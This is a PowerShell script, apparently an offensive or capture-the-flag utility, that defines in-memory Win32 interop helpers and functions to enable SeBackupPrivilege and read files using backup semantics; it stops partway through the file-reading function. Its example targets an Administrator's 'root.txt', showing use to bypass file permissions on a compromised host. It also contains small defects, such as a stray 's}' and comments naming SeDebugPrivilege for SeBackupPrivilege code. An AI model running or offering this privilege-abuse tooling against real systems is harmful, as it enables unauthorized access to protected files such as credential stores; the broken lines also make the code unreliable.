#Requires -Version 2

<#

    PowerShell version of SeDebugPrivilege

    Author: Lancelot (@rootSySdk)

#>

function New-InMemoryModule
{
<#
.SYNOPSIS
Creates an in-memory assembly and module
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.
.PARAMETER ModuleName
Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.
.EXAMPLE
$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [AppDomain]::CurrentDomain
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    if ($IsCoreCLR) {
        $AssemblyBuilder = [Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, 'Run')
    } else {
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    }

    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS
Creates a .NET type for an unmanaged Win32 function.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func
.DESCRIPTION
Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).
The 'func' helper function can be used to reduce typing when defining
multiple function definitions.
.PARAMETER DllName
The name of the DLL.
.PARAMETER FunctionName
The name of the target function.
.PARAMETER EntryPoint
The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.
.PARAMETER ReturnType
The return type of the function.
.PARAMETER ParameterTypes
The function parameters.
.PARAMETER NativeCallingConvention
Specifies the native calling convention of the function. Defaults to
stdcall.
.PARAMETER Charset
If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.
.PARAMETER SetLastError
Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.
.PARAMETER Module
The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER Namespace
An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
.NOTES
Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $EntryPoint,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($EntryPoint) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName,
                [Reflection.PropertyInfo[]] @(),
                [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
.SYNOPSIS
Creates an in-memory enumeration for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.
.PARAMETER Module
The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER FullName
The fully-qualified name of the enum.
.PARAMETER Type
The type of each enum element.
.PARAMETER EnumElements
A hashtable of enum elements.
.PARAMETER Bitfield
Specifies that the enum should be treated as a bitfield.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}
.NOTES
PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS
Creates an in-memory struct for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field
.DESCRIPTION
The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.
One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.
.PARAMETER Module
The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER FullName
The fully-qualified name of the struct.
.PARAMETER StructFields
A hashtable of fields. Use the 'field' helper function to ease
defining each field.
.PARAMETER PackingSize
Specifies the memory alignment of fields.
.PARAMETER ExplicitLayout
Indicates that an explicit offset for each field will be specified.
.PARAMETER CharSet
Dictates which character set marshaled strings should use.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}
$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}
# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout
.NOTES
PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout,

        [System.Runtime.InteropServices.CharSet]
        $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    switch($CharSet)
    {
        Ansi
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass
        }
        Auto
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass
        }
        Unicode
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass
        s}
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}

$Module = New-InMemoryModule -ModuleName BackupMode

$TOKEN_INFORMATION_CLASS = psenum $Module TOKEN_INFORMATION_CLASS UInt16 @{
    TokenPrivileges                      = 3
}

$FILE_ACCESS = psenum $Module FILE_ACCESS UInt32 @{
    GENERIC_WRITE            = 0x40000000
    GENERIC_READ             = 2147483648
} -Bitfield

$FILE_SHARE = psenum $Module FILE_SHARE UInt32 @{
    NONE   = 0x00000000
    READ   = 0x00000001
} -Bitfield

$CREATION_DISPOSITION = psenum $Module CREATION_DISPOSITION UInt32 @{
    CREATE_ALWAYS = 2
    OPEN_EXISTING = 3
}

$FILE_FLAGS_AND_ATTRIBUTES = psenum $Module FILE_FLAGS_AND_ATTRIBUTES UInt32 @{
    FILE_ATTRIBUTE_NORMAL        = 0x00000080
    FILE_FLAG_BACKUP_SEMANTICS   = 0x02000000
} -Bitfield

$TOKEN_ACCESS = psenum $Module TOKEN_ACCESS UInt32 @{
    TOKEN_QUERY              = 0x00000008
} -Bitfield


$SecurityEntity = psenum $Module SecurityEntity UInt32 @{
    SeBackupPrivilege               = 17
    SeRestorePrivilege              = 18
    SeShutdownPrivilege             = 19
    SeDebugPrivilege                = 20
    SeAuditPrivilege                = 21
    SeSystemEnvironmentPrivilege    = 22
    SeChangeNotifyPrivilege         = 23
    SeRemoteShutdownPrivilege       = 24
    SeUndockPrivilege               = 25
    SeSyncAgentPrivilege            = 26
    SeEnableDelegationPrivilege     = 27
    SeManageVolumePrivilege         = 28
    SeImpersonatePrivilege          = 29
    SeCreateGlobalPrivilege         = 30
    SeTrustedCredManAccessPrivilege = 31
    SeRelabelPrivilege              = 32
    SeIncreaseWorkingSetPrivilege   = 33
    SeTimeZonePrivilege             = 34
    SeCreateSymbolicLinkPrivilege   = 35
}

$SE_PRIVILEGE = psenum $Module SE_PRIVILEGE UInt32 @{
    DISABLED           = 0x00000000
    ENABLED_BY_DEFAULT = 0x00000001
    ENABLED            = 0x00000002
    REMOVED            = 0x00000004
    USED_FOR_ACCESS    = 2147483648
} -Bitfield

$LUID = struct $Module LUID @{
    LowPart  = field 0 $SecurityEntity
    HighPart = field 1 Int32
}

$LUID_AND_ATTRIBUTES = struct $Module LUID_AND_ATTRIBUTES @{
    Luid       = field 0 $LUID
    Attributes = field 1 $SE_PRIVILEGE
}

$TOKEN_PRIVILEGES = struct $Module TOKEN_PRIVILEGES @{
    PrivilegeCount = field 0 UInt32
    Privileges     = field 1  $LUID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 50)
}

$FunctionDefinition = @(
    #region advapi32

    (func advapi32 LookupPrivilegeDisplayName ([bool]) @(
        [string],                    #_In_opt_  LPCTSTR lpSystemName,
        [string],                    #_In_      LPCTSTR lpName,
        [System.Text.StringBuilder], #_Out_opt_ LPTSTR  lpDisplayName,
        [UInt32].MakeByRefType(),    #_Inout_   LPDWORD cchDisplayName,
        [UInt32].MakeByRefType()     #_Out_     LPDWORD lpLanguageId
    ) -EntryPoint LookupPrivilegeDisplayName -SetLastError),

    (func advapi32 LookupPrivilegeName ([bool]) @(
        [string],                    #_In_opt_  LPCTSTR lpSystemName
        [IntPtr],                    #_In_      PLUID   lpLuid
        [System.Text.StringBuilder], #_Out_opt_ LPTSTR  lpName
        [UInt32].MakeByRefType()     #_Inout_   LPDWORD cchName
    ) -EntryPoint LookupPrivilegeName -SetLastError),

    (func advapi32 OpenProcessToken ([bool]) @(
        [IntPtr],                #_In_  HANDLE  ProcessHandle
        [UInt32],                #_In_  DWORD   DesiredAccess
        [IntPtr].MakeByRefType() #_Out_ PHANDLE TokenHandle
    ) -EntryPoint OpenProcessToken -SetLastError),

    (func advapi32 GetTokenInformation ([bool]) @(
        [IntPtr],                #_In_      HANDLE                  TokenHandle
        [Int32],                 #_In_      TOKEN_INFORMATION_CLASS TokenInformationClass
        [IntPtr],                #_Out_opt_ LPVOID                  TokenInformation
        [UInt32],                #_In_      DWORD                   TokenInformationLength
        [UInt32].MakeByRefType() #_Out_     PDWORD                  ReturnLength
    ) -EntryPoint GetTokenInformation -SetLastError),

    #endregion advapi32

    #region kernel32

    (func kernel32 GetCurrentProcess ([IntPtr]) @() -EntryPoint GetCurrentProcess),

    (func kernel32 CreateFile ([IntPtr]) @(
        [string], #_In_     LPCTSTR               lpFileName
        [UInt32], #_In_     DWORD                 dwDesiredAccess
        [UInt32], #_In_     DWORD                 dwShareMode
        [IntPtr], #_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes
        [UInt32], #_In_     DWORD                 dwCreationDisposition
        [UInt32], #_In_     DWORD                 dwFlagsAndAttributes
        [IntPtr]  #_In_opt_ HANDLE                hTemplateFile
    ) -EntryPoint CreateFile -SetLastError),

    (func kernel32 CloseHandle ([bool]) @(
        [IntPtr] #_In_ HANDLE hObject
    ) -EntryPoint CloseHandle -SetLastError),

    (func kernel32 ReadFile ([bool]) @(
        [IntPtr],                 # HANDLE       hFile
        [Byte[]],                 # LPVOID       lpBuffer
        [UInt32],                 # DWORD        nNumberOfBytesToRead
        [UInt32].MakeByRefType(), # LPDWORD      lpNumberOfBytesRead
        [IntPtr]                  # LPOVERLAPPED lpOverlapped
    ) -EntryPoint ReadFile -SetLastError),

    (func kernel32 WriteFile ([bool]) @(
        [IntPtr],                 # HANDLE       hFile
        [Byte[]],                 # LPCVOID      lpBuffer
        [UInt32],                 # DWORD        nNumberOfBytesToWrite
        [UInt32].MakeByRefType(), # LPDWORD      lpNumberOfBytesWritten
        [IntPtr]                  # LPOVERLAPPED lpOverlapped
    ) -EntryPoint WriteFile -SetLastError),

    #endregion kernel32

    #region ntdll

    (func ntdll RtlAdjustPrivilege ([UInt32]) @(
        [Int32],                # int Privilege,
        [Bool],                 # bool bEnablePrivilege
        [Bool],                 # bool IsThreadPrivilege
        [Int32].MakeByRefType() # out bool PreviousValue
    ) -EntryPoint RtlAdjustPrivilege)

    #endregion ntdll
)

$Types = $FunctionDefinition | Add-Win32Type -Module $Module -Namespace BackupMode
$advapi32 = $Types['advapi32']
$kernel32 = $Types['kernel32']
$ntdll = $Types['ntdll']

function Get-SeBackupPrivilege {

<#

    .SYNOPSIS

    .DESCRIPTION

    .EXAMPLE

        Get-SeBackupPrivilege

#>

    [OutputType([bool])]
    [CmdletBinding()]

    param ()
    
    PROCESS {

        Write-Verbose "[Get-SeBackupPrivilege] Opening current process token"
        $hToken = [IntPtr]::Zero
        $Success = $advapi32::OpenProcessToken(($kernel32::GetCurrentProcess()), $TOKEN_ACCESS::TOKEN_QUERY, [ref]$hToken); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    
        if ($Success) {

            $TokenPtrSize = 0

            Write-Verbose "[Get-SeDebugPrivilege] Getting token informations"

            $Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::TokenPrivileges, 0, $TokenPtrSize, [ref]$TokenPtrSize)
            [IntPtr]$TokenPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPtrSize)
            $Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::TokenPrivileges, $TokenPtr, $TokenPtrSize, [ref]$TokenPtrSize); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {

                $TokenPrivileges = $TokenPtr -as $TOKEN_PRIVILEGES
                $returnValue = $false

                foreach($Privilege in $TokenPrivileges.Privileges) {

                    if (($Privilege.Luid.LowPart.ToString() -contains "SeBackupPrivilege") -and ($Privilege.Attributes.ToString().Contains("ENABLED"))) {

                        $returnValue = $true
                        break
                    }
                }
            } else {

                Write-Verbose "[Get-SeBackupPrivilege] Failed with error $(([System.ComponentModel.Win32Exception] $LastError).Message)"
                $returnValue  = $false
            }
        } else {

            Write-Verbose "[Get-SeBackupPrivilege] Failed with error $(([System.ComponentModel.Win32Exception] $LastError).Message)"
            $returnValue = $false
        }
    }

    END {
        
        return $returnValue
    }
}

function Set-SeBackupPrivilege {

<#

    .SYNOPSIS

        This function enable or disable SeDebugPrivilege

    .DESCRIPTION

        The function uses ntdll's RtlAdjustPrivilege function which change access token for current process. Modified version of harmj0y's one

    .PARAMETER Disabled

        Disable SeBackupPrivilege access token

    .EXAMPLE

        Set-SeBackupPrivilege

    .EXAMPLE

        Set-SeBackupPrivilege -Disabled
#>

    [OutputType([bool])]
    [CmdletBinding()]

    param (
        
        [Parameter(Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Switch]
        $Disabled
    )
    
    BEGIN {

        $PreviousState = [UInt32]::MinValue
    }

    PROCESS {

        Write-Verbose "[Set-SeBackupPrivilege] Setting SeBackupPrivilege to $((-not ($Disabled.IsPresent -and $true)))"

        $ReturnCode = $ntdll::RtlAdjustPrivilege($SecurityEntity::SeBackupPrivilege, (-not ($Disabled.IsPresent -and $true)), $false, [ref]$PreviousState)

        if ($ReturnCode -ne 0) {

            Write-Verbose "[Set-SeBackupPrivilege] Failed with error code $ReturnCode"
            $ReturnValue = $false
        } else {

            $ReturnValue = $true
        }
    }

    END {

        return $ReturnValue
    }
}

function Read-FileContent {

<#

    .SYNOPSIS

        This function use WinAPI to read content of a file

    .DESCRIPTION

        It will first get the full path of the file, get handle for it, and finally it will use ReadFile. Thanks to it, you can use
        access token for reading file, especially SeBackupPrivilege if enabled

    .PARAMETER Path

        Path of the file to read

    .PARAMETER Backup

        Will use backup mode

    .PARAMETER RawBuffer

        Will return the raw byte array from reading

    .EXAMPLE

        Read-FileContent -Backup -Path C:\Users\Administrator\Desktop\root.txt ;)

#>

    [OutputType([String],[Byte[]])]
    [CmdletBinding()]
    
    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [Switch]
        $Backup,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [Alias("Buffer")]
        [Switch]
        $RawBuffer
    )
    
    PROCESS {
        
        if (Test-Path $Path) {

            $Path = (Get-ItemProperty $Path).VersionInfo.FileName

            Write-Verbose "[Read-FileContent] Getting file handle"

            if ($Backup.IsPresent) {$FileAttribute = $FILE_FLAGS_AND_ATTRIBUTES::FILE_FLAG_BACKUP_SEMANTICS} else {$FileAttribute = $FILE_FLAGS_AND_ATTRIBUTES::NORMAL}
            $hFile = $kernel32::CreateFile($Path, $FILE_ACCESS::GENERIC_READ, $FILE_SHARE::READ, [IntPtr]::Zero, $CREATION_DISPOSITION::OPEN_EXISTING, $FileAttribute, [IntPtr]::Zero)

            $Size = (Get-ItemProperty $Path).Length
            $Buffer = New-Object byte[] $Size
            $BytesRead = [UInt32]::MinValue

            Write-Verbose "[Read-FileContent] Opening file"
            $Success = $kernel32::ReadFile($hFile, $Buffer, $Size, [ref]$BytesRead, [IntPtr]::Zero); $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $null = $kernel32::CloseHandle($hFile)

            if ($Success) {

                if ($RawBuffer.IsPresent) {
